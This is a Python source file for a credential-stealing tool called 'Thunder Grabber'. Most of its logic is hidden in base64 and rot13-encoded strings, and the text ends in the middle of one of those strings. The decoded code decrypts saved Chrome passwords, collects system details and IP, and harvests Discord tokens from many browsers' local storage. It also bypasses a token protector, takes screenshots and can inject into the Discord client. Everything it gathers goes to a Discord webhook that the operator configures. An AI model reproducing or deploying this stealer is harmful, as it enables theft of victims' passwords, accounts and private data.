import base64, codecs
import requests
import os
import json
import base64
import winreg
import shutil
import psutil
import random
import zipfile
import socket
import sqlite3
import platform
import win32crypt

from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from PIL import ImageGrab
from threading import Thread
from re import findall, match
from discord import File, Webhook, RequestsWebhookAdapter
from discord_webhook import DiscordWebhook, DiscordEmbed
from getmac import get_mac_address as gma

weblink = "YOUR_WEBHOOK"
injection = "YES_NO"


magic = 'Y2xhc3Mgc3B5d2FyZToNCiAgICBpcCA9ICIiDQogICAgY3VycmVudF91c2VyID0gIiINCg0KICAgIGRlZiBfX2luaXRfXyhzZWxmKToNCiAgICAgICAgc2VsZi5pcCA9ICIiDQogICAgICAgIHNlbGYuY3VycmVudF91c2VyID0gIiINCg0KICAgIGRlZiBmZXRjaF9lbmNyeXB0aW9uX2tleShzZWxmKToNCiAgICAgICAgbG9jYWxfY29tcHV0ZXJfZGlyZWN0b3J5X3BhdGggPSBvcy5wYXRoLmpvaW4oDQogICAgICAgIG9zLmVudmlyb25bIlVTRVJQUk9GSUxFIl0sICJBcHBEYXRhIiwgIkxvY2FsIiwgIkdvb2dsZSIsICJDaHJvbWUiLCANCiAgICAgICAgIlVzZXIgRGF0YSIsICJMb2NhbCBTdGF0ZSIpDQogICAgICAgIA0KICAgICAgICB3aXRoIG9wZW4obG9jYWxfY29tcHV0ZXJfZGlyZWN0b3J5X3BhdGgsICJyIiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoNCiAgICAgICAgICAgIGxvY2FsX3N0YXRlX2RhdGEgPSBmLnJlYWQoKQ0KICAgICAgICAgICAgbG9jYWxfc3RhdGVfZGF0YSA9IGpzb24ubG9hZHMobG9jYWxfc3RhdGVfZGF0YSkNCiAgICANCiAgICAgICAgZW5jcnlwdGlvbl9rZXkgPSBiYXNlNjQuYjY0ZGVjb2RlKA0KICAgICAgICBsb2NhbF9zdGF0ZV9kYXRhWyJvc19jcnlwdCJdWyJlbmNyeXB0ZWRfa2V5Il0pDQogICAgICAgIGVuY3J5cHRpb25fa2V5ID0gZW5jcnlwdGlvbl9rZXlbNTpdDQogICAgICAgIA0KICAgICAgICByZXR1cm4gd2luMzJjcnlwdC5DcnlwdFVucHJvdGVjdERhdGEoZW5jcnlwdGlvbl9rZXksIE5vbmUsIE5vbmUsIE5vbmUsIDApWzFdDQogICANCiAgICBkZWYgZGVjcnlwdF9wYXNzd29yZHMoc2VsZiwgcGFzc3dvcmQsIGVuY3J5cHRpb25fa2V5KToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgaXYgPSBwYXNzd29yZFszOjE1XQ0KICAgICAgICAgICAgcGFzc3dvcmQgPSBwYXNzd29yZFsxNTpdDQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIGNpcGhlciA9IEFFUy5uZXcoZW5jcnlwdGlvbl9rZXksIEFFUy5NT0RFX0dDTSwgaXYpICAgICAgICAgICAgDQogICAgICAgICAgICByZXR1cm4gY2lwaGVyLmRlY3J5cHQocGFzc3dvcmQpWzotMTZdLmRlY29kZSgpDQogICAgICAgIGV4Y2VwdDogICAgDQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgcmV0dXJuIHN0cih3aW4zMmNyeXB0LkNyeXB0VW5wcm90ZWN0RGF0YShwYXNzd29yZCwgTm9uZSwgTm9uZSwgTm9uZSwgMClbMV0pDQogICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgcmV0dXJuICJObyBQYXNzd29yZHMiDQoNCiAgICBkZWYgZ2V0X3Bhc3N3b3JkcyhzZWxmKToNCiAgICAgICAgZmluYWxfYW5zID0gIlxuQ2hyb21lIFBhc3N3b3JkczpcbiINCiAgICAgICAga2V5ID0gc2VsZi5mZXRjaF9lbmNyeXB0aW9uX2tleSgpDQogICAgICAgIGRiX3BhdGggPSBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkFwcERhdGEiLCAiTG9jYWwiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICJHb29nbGUiLCAiQ2hyb21lIiwgIlVzZXIgRGF0YSIsICJkZWZhdWx0IiwgIkxvZ2luIERhdGEiKQ0KICAgICAgICANCiAgICAgICAgZmlsZW5hbWUgPSAiQ2hyb21lUGFzc3dvcmRzLmRiIg0KICAgICAgICBzaHV0aWwuY29weWZpbGUoZGJfcGF0aCwgZmlsZW5hbWUpICAgICAgICANCiAgICAgICAgZGIgPSBzcWxpdGUzLmNvbm5lY3QoZmlsZW5hbWUpDQogICAgICAgIGN1cnNvciA9IGRiLmN1cnNvcigpDQogICAgICAgICAgICAgICAgDQogICAgICAgIGN1cnNvci5leGVjdXRlKA0KICAgICAgICAgICAgInNlbGVjdCBvcmlnaW5fdXJsLCBhY3Rpb25fdXJsLCB1c2VybmFtZV92YWx1ZSwgcGFzc3dvcmRfdmFsdWUsIGRhdGVfY3JlYXRlZCwgZGF0ZV9sYXN0X3VzZWQgZnJvbSBsb2dpbnMgIg0KICAgICAgICAgICAgIm9yZGVyIGJ5IGRhdGVfbGFzdF91c2VkIikNCiAgICAgICAgDQogICAgICAgIGZvciByb3cgaW4gY3Vyc29yLmZldGNoYWxsKCk6DQogICAgICAgICAgICBtYWluX3VybCA9IHJvd1swXQ0KICAgICAgICAgICAgbG9naW5fdXJsID0gcm93WzFdDQogICAgICAgICAgICB1c2VybmFtZSA9IHJvd1syXQ0KICAgICAgICAgICAgcGFzc3dvcmQgPSBzZWxmLmRlY3J5cHRfcGFzc3dvcmRzKHJvd1szXSwga2V5KQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiB1c2VybmFtZSBvciBwYXNzd29yZDogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBmaW5hbF9hbnMgKz0gZiJNYWluIFVSTDoge21haW5fdXJsfVxuIg0KICAgICAgICAgICAgICAgIGZpbmFsX2FucyArPSBmIkxvZ2luIFVSTDoge2xvZ2luX3VybH1cbiINCiAgICAgICAgICAgICAgICBmaW5hbF9hbnMgKz0gZiJVc2VybmFtZToge3VzZXJuYW1lfVxuIg0KICAgICAgICAgICAgICAgIGZpbmFsX2FucyArPSBmIlBhc3N3b3JkOiB7cGFzc3dvcmR9XG5cbiINCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgY29udGludWUNCg0KICAgICAgICAgICAgZmluYWxfYW5zICs9ICI9IiAqIDgwICsgIlxuXG4iDQoNCiAgICAgICAgY3Vyc29yLmNsb3NlKCkNCiAgICAgICAgZGIuY2xvc2UoKQ0KICAgICAgICANCiAgICAgICAgdHJ5OiAgICAgICAgICAgIA0KICAgICAgICAgICAgb3MucmVtb3ZlKGZpbGVuYW1lKQ0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBwYXNzDQoNCiAgICAgICAgcmV0dXJuIGZpbmFsX2Fucw0KDQogICAgZGVmIGdldF9zeXN0ZW1faW5mbyhzZWxmKToNCiAgICAgICAgZmluYWxfc3RyID0gIlxuU3lzdGVtIEluZm9ybWF0aW9uOlxuIg0KICAgICAgICANCiAgICAgICAgZGF0YV9kaWN0aW9uYXJ5ID0geyJJUC1BZGRyZXNzIiA6ICIiLCAiSG9zdG5hbWUiIDogIiIsICJQbGF0Zm9ybToiIDogIiIsICJSZWxlYXNlLURhdGEiIDogIiIsICJWZXJzaW9uIiA6ICIiLCAiUHJvY2Vzc29yIiA6ICIiLCAiQXJjaGl0ZWN0dXJlIiA6ICIiLCAiUmFtIiA6ICIifQ0KICAgICAgICBkYXRhX2RpY3Rpb25hcnlbIlBsYXRmb3JtOiJdID0gcGxhdGZvcm0uc3lzdGVtKCkNCiAgICAgICAgZGF0YV9kaWN0aW9uYXJ5WyJSZWxlYXNlLURhdGEiXSA9IHBsYXRmb3JtLnJlbGVhc2UoKQ0KICAgICAgICBkYXRhX2RpY3Rpb25hcnlbIlZlcnNpb24iXSA9IHBsYXRmb3JtLnZlcnNpb24oKQ0KICAgICAgICBkYXRhX2RpY3Rpb25hcnlbIkFyY2hpdGVjdHVyZSJdID0gcGxhdGZvcm0ubWFjaGluZSgpDQogICAgICAgIGRhdGFfZGljdGlvbmFyeVsiSG9zdG5hbWUiXSA9IHNvY2tldC5nZXRob3N0bmFtZSgpDQogICAgICAgIGRhdGFfZGljdGlvbmFyeVsiSVAtQWRkcmVzcyJdID0gc29ja2V0LmdldGhvc3RieW5hbWUoc29ja2V0LmdldGhvc3RuYW1lKCkpDQogICAgICAgIGRhdGFfZGljdGlvbmFyeVsiUHJvY2Vzc29yIl0gPSBwbGF0Zm9ybS5wcm9jZXNzb3IoKQ0KICAgICAgICBkYXRhX2RpY3Rpb25hcnlbIlJhbSJdID0gc3RyKHJvdW5kKHBzdXRpbC52aXJ0dWFsX21lbW9yeSgpLnRvdGFsIC8gKDEwMjQuMCAqKjMpKSkgKyIgR0IiDQogICAgICAgIA0KICAgICAgICBzZWxmLmlwID0gZGF0YV9kaWN0aW9uYXJ5WyJJUC1BZGRyZXNzIl0NCiAgICAgICAgZm9yIGtleSwgdmFsdWUgaW4gZGF0YV9kaWN0aW9uYXJ5Lml0ZW1zKCk6DQogICAgICAgICAgICBmaW5hbF9zdHIgKz0gInt9OiB7fVxuIi5mb3JtYXQoa2V5LCB2YWx1ZSkgICAgICAgICAgICANCg0KICAgICAgICByZXR1cm4gZmluYWxfc3RyDQoNCiAgICBkZWYgZ2V0X2luZm8oc2VsZik6DQogICAgICAgIHN5c3RlbV9pbmZvID0gIlRIVU5ERVIgR1JBQkJFUiBNQURFIEJZIFRXSVNUWDcjOTEyMiB8IGh0dHBzOi8vZ2l0aHViLmNvbS9UV0lTVC1YNyINCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgc3lzdGVtX2luZm8gKz0gc2VsZi5nZXRfc3lzdGVtX2luZm8oKQ0KICAgICAgICAgICAgc3lzdGVtX2luZm8gKz0gc2VsZi5nZXRfcGFzc3dvcmRzKCkNCg0KICAgICAgICAgICAgcmV0dXJuIHN5c3RlbV9pbmZvDQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246DQogICAgICAgICAgICBwYXNzDQogIA0KICANCiAgICANCiAgICAgICAgDQpjbGFzcyBncmFiYmVyOg0KICAgIA0KICAgIGRlZiBfX2luaXRfXyhzZWxmKToNCg0KICAgICAgICBzZWxmLmJhc2V1cmwgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvdXNlcnMvQG1lIg0KICAgICAgICBzZWxmLmFwcGRhdGEgPSBvcy5nZXRlbnYoImxvY2FsYXBwZGF0YSIpDQogICAgICAgIHNlbGYucm9hbWluZyA9IG9zLmdldGVudigiYXBwZGF0YSIpDQogICAgICAgIHNlbGYucmVnZXggPSByIltcdy1dezI0fVwuW1x3LV17Nn1cLltcdy1dezI3fSIsIHIibWZhXC5bXHctXXs4NH0iDQogICAgICAgIHNlbGYuZW5jcnlwdGVkX3JlZ2V4ID0gciJkUXc0dzlXZ1hjUTpbXi4qXFsnKC4qKSdcXS4qJF0qIg0KICAgICAgICBzZWxmLnRva2VucyA9IFtdDQogICAgICAgIA0KICAgICAgICAjVGhyZWFkKHRhcmdldD1zZWxmLmtpbGxEaXNjb3JkKS5zdGFydCgpDQogICAgICAgIHNlbGYuYnlwYXNzVG9rZW5Qcm90ZWN0b3IoKQ0KICAgICAgICBzZWxmLmdyYWJUb2tlbnMoKQ0KICAgICAgICBUaHJlYWQodGFyZ2V0PXNlbGYuc2NyZWVuc2hvdCkuc3RhcnQoKQ0KICAgICAgICBpZiBpbmplY3Rpb24gPT0gInkiOg0KICAgICAgICAgICAgc2VsZi5pbmplY3RvcigpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBwYXNzDQogICAgICAgIHNlbGYuU2VuZEluZm8oKQ0KICAgICAgICANCiAgICANCiAgICBkZWYgZ2V0aGVhZGVycyhzZWxmLCB0b2tlbj1Ob25lLCBjb250ZW50X3R5cGU9ImFwcGxpY2F0aW9uL2pzb24iKToNCiAgICAgICAgaGVhZGVycyA9IHsNCiAgICAgICAgICAgICJDb250ZW50LVR5cGUiOiBjb250ZW50X3R5cGUsDQogICAgICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4xMSAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8yMy4wLjEyNzEuNjQgU2FmYXJpLzUzNy4xMSINCiAgICAgICAgfQ0KICAgICAgICBpZiB0b2tlbjoNCiAgICAgICAgICAgIGhlYWRlcnMudX'
love = 'OxLKEyXUfvDKI0nT9lnKcuqTyiovV6VUEin2IhsFxAPvNtVPNtVPNtpzI0qKWhVTuyLJEypaZAPvNtVPNAPvNtVPOxMJLtM2I0K21up3Eypy9eMKxbp2IfMvjtpTS0nPx6QDbtVPNtVPNtVUqcqTtto3OyovujLKEbYPNvpvVfVTIhL29xnJ5aCFW1qTLgBPVcVTSmVTL6QDbtVPNtVPNtVPNtVPOfo2AuoS9mqTS0MFN9VTLhpzIuMPtcQDbtVPNtVPNtVTkiL2SfK3A0LKEyVQ0tnaAiov5fo2Sxplufo2AuoS9mqTS0MFxAPt0XVPNtVPNtVPOgLKA0MKWsn2I5VQ0tLzSmMGL0YzV2ATEyL29xMFufo2AuoS9mqTS0MIfvo3AsL3W5pUDvKIfvMJ5wpayjqTIxK2gyrFWqXD0XVPNtVPNtVPOgLKA0MKWsn2I5VQ0toJSmqTIlK2gyrIf1By0APvNtVPNtVPNtoJSmqTIlK2gyrFN9VRAlrKO0IJ5jpz90MJA0ETS0LFugLKA0MKWsn2I5YPOBo25yYPOBo25yYPOBo25yYPNjXIfkKD0XVPNtVPNtVPOlMKE1pz4toJSmqTIlK2gyrD0XVPNtVN0XVPNtVTEyMvOcozcyL3EipvumMJkzXGbAPvNtVPNtVPNtMz9lVS9xnKVtnJ4to3ZhoTymqTEcpvumMJkzYzSjpTEuqTRcBt0XVPNtVPNtVPNtVPNtnJLtW2Ecp2AipzDaVTyhVS9xnKVhoT93MKVbXGbAPvNtVPNtVPNtVPNtVPNtVPOzo3VtK19xnKVtnJ4to3ZhoTymqTEcpvuipl5jLKEbYzSvp3OuqTtbp2IfMv5upUOxLKEuX29mYaAypPgsMTylXFx6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVTyzVT1uqTAbXUVaLKOjYFupMPcpYykxXvxdWljtK19xnKVcBt0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtLJWmpTS0nPN9VT9mYaOuqTthLJWmpTS0nPumMJkzYzSjpTEuqTReo3Zhp2IjX19xnKVeo3Zhp2IjX19sMTylXFNAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTLtCFOlMKS1MKA0pl5aMKDbVzu0qUOmBv8ipzS3YzqcqTu1LaImMKWwo250MJ50YzAioF9HI0yGIP1LAl9ho3EbnJ5aZv9gLJyhY0yhnzIwqTyiov1woTIuov5dplVcYaEyrUDhpzIjoTSwMFtvWIqSDxuCG0fyVvjtq2IvoTyhnlxAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUqcqTtto3OyovuuLaAjLKEbXlqpKT1iMUIfMKApKTEcp2AipzEsMTImn3EipS9wo3WyYGWpKTEcp2AipzEsMTImn3EipS9wo3WyKSkcozEyrP5dplpfVPq3WljtMJ5wo2Ecozp9VaI0Mv04VvxtLKZtnJ5xMKuTnJkyBt0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTyhMTI4EzyfMF53pzy0MFuzXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNto3Zhp3EupaEznJkyXTSvp3OuqTteo3Zhp2IjX19xnKVeWl5yrTHaXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtQDbtVPNtMTIzVTgcoTkRnKAwo3WxXUAyoTLcBt0XVPNtVPNtVPOzo3VtpUWiLlOcovOjp3I0nJjhpUWiL2Imp19cqTIlXPx6QDbtVPNtVPNtVPNtVPOcMvOuoaxbpUWiL3A0pvOcovOjpz9wYz5uoJHbXF5fo3qypvtcVTMipvOjpz9wp3ElVTyhKN0XVPNtVPNtVPNtVPNtJlqxnKAwo3WxWljtW2Ecp2AipzE0o2gyoaOlo3EyL3EipvpfVPqxnKAwo3WxL2ShLKW5WljtW2Ecp2AipzExMKMyoT9joJIhqPpfVPqxnKAwo3WxpUEvW10cBt0XVPNtVPNtVPNtVPNtVPNtVUElrGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtpUWiLl5enJkfXPxAPvNtVPNtVPNtVPNtVPNtVPOyrTAypUDtpUA1qTyfYx5iH3IwnSOlo2Ayp3Z6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVUOup3ZAPvNtVPNAPvNtVPOxMJLtLayjLKAmIT9eMJ5Dpz90MJA0o3Vbp2IfMvx6QDbtVPNtVPNtVUEjVQ0tMvW7p2IfMv5lo2SgnJ5asIkpETymL29lMSEin2IhHUWiqTIwqT9lKSjvQDbtVPNtVPNtVTAiozMcMlN9VUEjXlWwo25znJphnaAiovVAPvNtVPNtVPNtMz9lVTxtnJ4tJlWRnKAwo3WxIT9eMJ5Dpz90MJA0o3VhMKuyVvjtVyOlo3EyL3Eco25DLKyfo2SxYzEfoPVfVPWmMJA1pzHhMTS0Vy06QDbtVPNtVPNtVPNtVPO0pax6QDbtVPNtVPNtVPNtVPNtVPNto3ZhpzIgo3MyXUEjX2xcQDbtVPNtVPNtVPNtVPOyrTAypUDtEKuwMKO0nJ9hBt0XVPNtVPNtVPNtVPNtVPNtVUOup3ZtQDbtVPNtVPNtVUElrGbAPvNtVPNtVPNtVPNtVUqcqTtto3Oyovuwo25znJpcVTSmVTL6QDbtVPNtVPNtVPNtVPNtVPNtnKEyoFN9VTcmo24hoT9uMPuzXD0XVPNtVPNtVPNtVPNtVPNtVTy0MJ1oW2S1qT9sp3EupaDaKFN9VRMuoUAyQDbtVPNtVPNtVPNtVPNtVPNtnKEyoIfaLKI0o19mqTSlqS9xnKAwo3WxW10tCFOTLJkmMD0XVPNtVPNtVPNtVPNtVPNtVTy0MJ1oW2yhqTIapzy0rFqqVQ0tEzSfp2HAPvNtVPNtVPNtVPNtVPNtVPOcqTIgJlqcoaEyM3WcqUysLJkfo3qvMKE0MKWxnKAwo3WxW10tCFOTLJkmMD0XVPNtVPNtVPNtVPNtVPNtVTy0MJ1oW2yhqTIapzy0rI9wnTIwn2I4MJA1qTSvoTHaKFN9VRMuoUAyQDbtVPNtVPNtVPNtVPNtVPNtnKEyoIfanJ50MJqlnKE5K2AbMJAenTSmnPqqVQ0tEzSfp2HAPvNtVPNtVPNtVPNtVPNtVPOcqTIgJlqcoaEyM3WcqUysL2uyL2ggo2E1oTHaKFN9VRMuoUAyQDbtVPNtVPNtVPNtVPNtVPNtnKEyoIfanJ50MJqlnKE5K2AbMJAep2AlnKO0plqqVQ0tEzSfp2HAPvNtVPNtVPNtVPNtVPNtVPOcqTIgJlqcoaEyM3WcqUysL2uyL2glMKAiqKWwMFqqVQ0tEzSfp2HAPvNtVPNtVPNtVPNtVPNtVPOcqTIgJlqcoaEyM3WcqUyspzIxo3qhoT9uMTuup2uyplqqVQ0tEzSfp2HAPvNtVPNtVPNtVPNtVPNtVPOcqTIgJlqcqTIlLKEco25mK2y2W10tCFNmAwDAPvNtVPNtVPNtVPNtVPNtVPOcqTIgJlqcqTIlLKEco25mK2gyrFqqVQ0tAQH3QDbtVPNtVPNtVPNtVPNtVPNtnKEyoIfaqzIlp2yiovqqVQ0tAwx0ZwNAPt0XVPNtVPNtVPNtVPNtq2y0nPOipTIhXTAiozMcMljtW3paXFOuplOzBt0XVPNtVPNtVPNtVPNtVPNtVTcmo24hMUIgpPucqTIgYPOzYPOcozEyoaD9Zvjtp29lqS9eMKymCIElqJHcQDbAPt0XVPNtVPNtVPOyrTAypUDtEKuwMKO0nJ9hBt0XVPNtVPNtVPNtVPNtpTSmpj0XVPNtVN0XVPNtVTEyMvOxMJAlrKO0K3OurJkiLJDbp2IfMvjtL2yjnTIlYPOjLKyfo2SxXGbAPvNtVPNtVPNtpzI0qKWhVTAcpTuypv5xMJAlrKO0XUOurJkiLJDcQDbtVPNtQDbtVPNtMTIzVTqyozIlLKEyK2AcpTuypvumMJkzYPOuMKAsn2I5YPOcqvx6QDbtVPNtVPNtVUWyqUIlovOOEIZhozI3XTSyp19eMKxfVRSSHl5AG0ESK0qQGFjtnKLcQDbtVPNtQDbtVPNtMTIzVTEyL3W5pUEspTSmp3qipzDbp2IfMvjtLaIzMvjtoJSmqTIlK2gyrFx6QDbtVPNtVPNtVUElrGbAPvNtVPNtVPNtVPNtVTy2VQ0tLaIzMyfmBwR1KD0XVPNtVPNtVPNtVPNtpTS5oT9uMPN9VTW1MzMoZGH6KD0XVPNtVPNtVPNtVPNtL2yjnTIlVQ0tp2IfMv5aMJ5ypzS0MI9wnKObMKVboJSmqTIlK2gyrFjtnKLcQDbtVPNtVPNtVPNtVPOxMJAlrKO0MJEspTSmplN9VUAyoTLhMTIwpayjqS9jLKyfo2SxXTAcpTuypvjtpTS5oT9uMPxAPvNtVPNtVPNtVPNtVTEyL3W5pUEyMS9jLKAmVQ0tMTIwpayjqTIxK3Oup3AoBv0kAy0hMTIwo2EyXPxAPvNtVPNtVPNtVPNtVUWyqUIlovOxMJAlrKO0MJEspTSmpj0XVPNtVPNtVPOyrTAypUDtEKuwMKO0nJ9hBt0XVPNtVPNtVPNtVPNtpzI0qKWhVPWTLJyfMJDtqT8tMTIwpayjqPOjLKAmq29lMPVAPvNtVPNtVPNtQDbtVPNtVPNtVPNtVPNtVPNtVPNAPvNtVPOxMJLtM2I0HUWiMUIwqRgyrFumMJkzYPOjLKEbBvOmqUVtCFOlW1ACEyEKDIWSKR1cL3Wip29zqSkKnJ5xo3qmVR5HKRA1paWyoaEJMKWmnJ9hWlx6QDbtVPNtVPNtVTEyMvOmqUWHo0yhqPu4XGbAPvNtVPNtVPNtVPNtVTyzVTymnJ5mqTShL2HbrPjtp3ElXGbAPvNtVPNtVPNtVPNtVPNtVPOlMKE1pz4to3WxXUtcQDbtVPNtVPNtVPNtVPOlMKE1pz4trN0XVPNtVPNtVPOwnTSlplN9VPqPD0ETE0uXF01DHIWHIyqLJGVmAQL3BQxaQDbtVPNtVPNtVUqeMKxtCFNaWj0XVPNtVPNtVPOiMzMmMKDtCFN1Zt0XVPNtVPNtVPOlMJqeMKxtCFO3nJ5lMJphG3OyoxgyrFu3nJ5lMJphFRgSJI9ZG0AOGS9ADHAVFH5SYUOuqTtcQDbtVPNtVPNtVUMuoPjtKlN9VUqcoaWyMl5EqJIlrIMuoUIyEKtbpzIan2I5YPNaETyanKEuoSOlo2E1L3EWMPpcQDbtVPNtVPNtVUOlo2E1L3EBLJ1yYPOsVQ0tq2yhpzIaYyS1MKW5IzSfqJISrPulMJqeMKxfVPWDpz9xqJA0GzSgMFVcQDbtVPNtVPNtVTgyrFN9VTkcp3DbqzSfXD0XQDbtVPNtVPNtVTMipvOcVTyhVUWuozqyXQV0YP0kYPNgZFx6QDbtVPNtVPNtVPNtVPO0MJ1jVQ0tZN0XVPNtVPNtVPNtVPNtMz9lVTbtnJ4tpzShM2HbZGDfYGRfYGRcBt0XVPNtVPNtVPNtVPNtVPNtVUEyoKNtXw0tZwH2QDbtVPNtVPNtVPNtVPNtVPNtqUW5Bt0XVPNtVPNtVPNtVPNtVPNtVPNtVPO0MJ1jVPf9VUA0pyEiFJ50XTgyrIgdXlOiMzMmMKEqXD0XVPNtVPNtVPNtVPNtVPNtVTI4L2IjqPOWozEyrRIlpz9lBt0XVPNtVPNtVPNtVPNtVPNtVPNtVPOlMKE1pz4tJ3Olo2E1L3EBLJ1yYPNvVy0APvNtVPNtVPNtVPNtVPNtVPOcMvO0MJ1jVP8tZwDtCQ0tZwH1Bt0XVPNtVPNtVPNtVPNtVPNtVPNtVPOeMKyonvfto2Mzp2I0KFN9VUEyoKNiZwDAPvNtVPNtVPNtVPNtVPNtVPOyoUAyBt0XVPNtVPNtVPNtVPNtVPNtVPNtVPOeMKyonvfto2Mzp2I0KFN9VQV1AD0XVPNtVPNtVPNtVPNtVPNtVUEyoKNtCFOcoaDbqTIgpPNyVQV0XD0XVPNtVPNtVPNtVPNtq2gyrFN9VTAbLKWmJ3EyoKOqVPftq2gyrD0XVPNtVPNtVPOzo3VtnFOcovOlLJ5aMFt1YTkyovu3n2I5XFj2XGbAPvNtVPNtVPNtVPNtVUqeMKxtCFO3n2I5JmccKFNeVPpgWlNeVUqeMKyonGcqQDbtVPNtVPNtVUWyqUIlovOopUWiMUIwqR5uoJHfVUqeMKyqQDbtVPNtVPNtVN0XVPNtVTEyMvOapzSvIT9eMJ5mXUAyoTLcBt0XVPNtVPNtVPOjLKEbplN9VUfAPvNtVPNtVPNtVPNtVPqRnKAwo3WxWmbtp2IfMv5lo2SgnJ5aVPftpvqpKTEcp2AipzEpKRkiL2SfVSA0o3WuM2IpKTkyqzIfMTWpKPpfQDbtVPNtVPNtVPNtVPNaETymL29lMPOQLJ5upaxaBvOmMJkzYaWiLJ1cozptXlOlW1kpMTymL29lMTAuozSlrIkpGT9wLJjtH3EipzSaMIkpoTI2MJkxLykpWljAPvNtVPNtVPNtVPNtVPqZnJqbqTAipzDaBvOmMJkzYaWiLJ1cozptXlOlW1kpGTyanUEwo3WxKSkZo2AuoPOGqT9lLJqyKSkfMKMyoTEvKSjaYN0XVPNtVPNtVPNtVPNtW0Ecp2AipzDtHSEPWmbtp2IfMv5lo2SgnJ5aVPftpvqpKTEcp2AipzEjqTWpKRkiL2SfVSA0o3WuM2IpKTkyqzIfMTWpKPpfQDbt'
god = 'ICAgICAgICAgICAnT3BlcmEnOiBzZWxmLnJvYW1pbmcgKyByJ1xcT3BlcmEgU29mdHdhcmVcXE9wZXJhIFN0YWJsZVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywNCiAgICAgICAgICAgICdPcGVyYSBHWCc6IHNlbGYucm9hbWluZyArIHInXFxPcGVyYSBTb2Z0d2FyZVxcT3BlcmEgR1ggU3RhYmxlXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLA0KICAgICAgICAgICAgJ0FtaWdvJzogc2VsZi5hcHBkYXRhICsgcidcXEFtaWdvXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsDQogICAgICAgICAgICAnVG9yY2gnOiBzZWxmLmFwcGRhdGEgKyByJ1xcVG9yY2hcXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywNCiAgICAgICAgICAgICdLb21ldGEnOiBzZWxmLmFwcGRhdGEgKyByJ1xcS29tZXRhXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsDQogICAgICAgICAgICAnT3JiaXR1bSc6IHNlbGYuYXBwZGF0YSArIHInXFxPcmJpdHVtXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsDQogICAgICAgICAgICAnQ2VudEJyb3dzZXInOiBzZWxmLmFwcGRhdGEgKyByJ1xcQ2VudEJyb3dzZXJcXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywNCiAgICAgICAgICAgICc3U3Rhcic6IHNlbGYuYXBwZGF0YSArIHInXFw3U3RhclxcN1N0YXJcXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywNCiAgICAgICAgICAgICdTcHV0bmlrJzogc2VsZi5hcHBkYXRhICsgcidcXFNwdXRuaWtcXFNwdXRuaWtcXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywNCiAgICAgICAgICAgICdWaXZhbGRpJzogc2VsZi5hcHBkYXRhICsgcidcXFZpdmFsZGlcXFVzZXIgRGF0YVxcRGVmYXVsdFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywNCiAgICAgICAgICAgICdDaHJvbWUgU3hTJzogc2VsZi5hcHBkYXRhICsgcidcXEdvb2dsZVxcQ2hyb21lIFN4U1xcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLA0KICAgICAgICAgICAgJ0Nocm9tZSc6IHNlbGYuYXBwZGF0YSArIHInXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxEZWZhdWx0XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLA0KICAgICAgICAgICAgJ0VwaWMgUHJpdmFjeSBCcm93c2VyJzogc2VsZi5hcHBkYXRhICsgcidcXEVwaWMgUHJpdmFjeSBCcm93c2VyXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsDQogICAgICAgICAgICAnTWljcm9zb2Z0IEVkZ2UnOiBzZWxmLmFwcGRhdGEgKyByJ1xcTWljcm9zb2Z0XFxFZGdlXFxVc2VyIERhdGFcXERlZmF1bFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywNCiAgICAgICAgICAgICdVcmFuJzogc2VsZi5hcHBkYXRhICsgcidcXHVDb3pNZWRpYVxcVXJhblxcVXNlciBEYXRhXFxEZWZhdWx0XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLA0KICAgICAgICAgICAgJ1lhbmRleCc6IHNlbGYuYXBwZGF0YSArIHInXFxZYW5kZXhcXFlhbmRleEJyb3dzZXJcXFVzZXIgRGF0YVxc